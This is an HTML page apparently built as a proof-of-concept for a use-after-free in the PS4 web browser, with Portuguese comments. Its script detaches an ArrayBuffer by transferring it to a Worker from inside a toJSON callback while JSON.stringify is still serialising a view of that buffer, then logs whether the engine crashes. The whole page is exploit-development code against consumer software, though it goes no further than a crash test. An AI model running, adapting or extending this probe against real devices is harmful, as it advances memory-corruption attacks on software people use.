<!DOCTYPE html>
<html>
<head>
    <title>PS4 Buffer Detach PoC</title>
    <style>
        body { background: #200; color: #fff; font-family: monospace; padding: 20px; font-size: 24px; }
        #log { border: 1px solid #f00; padding: 10px; }
    </style>
</head>
<body>
    <h3>POC: BUFFER DETACH (UAF)</h3>
    <div id="log">Iniciando...</div>

    <script>
        const logDiv = document.getElementById('log');
        function log(msg) {
            const div = document.createElement('div');
            div.innerText = msg;
            logDiv.appendChild(div);
        }

        async function runDetachExploit() {
            log("1. Criando Vítima (TypedArray)...");
            
            // Cria um buffer de memória real
            const buffer = new ArrayBuffer(1024 * 16); // 16KB
            const view = new Uint32Array(buffer);
            
            // Preenche com dados para o JSON ter o que ler
            for(let i=0; i<view.length; i++) view[i] = 0x41414141;
            
            // O objeto que será serializado
            // Colocamos o 'view' DEPOIS de um gatilho
            const target = {
                a: { 
                    toJSON: () => {
                        log(">>> ARMADILHA: DETACHING BUFFER! <<<");
                        
                        // AQUI É O GOLPE:
                        // Transferimos o buffer para um worker.
                        // Isso torna o buffer 'neutered' (tamanho 0, ponteiro nulo) na thread principal
                        // Mas o JSON.stringify C++ talvez ainda tenha o ponteiro antigo.
                        try {
                            const worker = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                            worker.postMessage(buffer, [buffer]);
                            worker.terminate();
                            
                            if (buffer.byteLength === 0) {
                                log("SUCESSO: Buffer desconectado (Size: 0)!");
                            } else {
                                log("FALHA: Não conseguiu desconectar.");
                            }
                        } catch(e) {
                            log("Erro no Detach: " + e.message);
                        }
                        
                        return "trap_executed";
                    }
                },
                b: view // O motor vai tentar ler isso LOGO APÓS a armadilha
            };

            log("2. Disparando JSON.stringify...");
            await new Promise(r => setTimeout(r, 500));

            try {
                // Se o motor não checar se o buffer foi desconectado entre 'a' e 'b',
                // ele vai ler memória morta -> CRASH.
                JSON.stringify(target);
                log("3. Sobreviveu (O motor checou o estado do buffer)");
            } catch(e) {
                log("Erro capturado: " + e.message);
                if (e.message.includes("detached") || e.name === "TypeError") {
                    log("RESULTADO: O navegador bloqueou o acesso (Safe).");
                }
            }
        }

        setTimeout(runDetachExploit, 1000);
    </script>
</body>
</html>
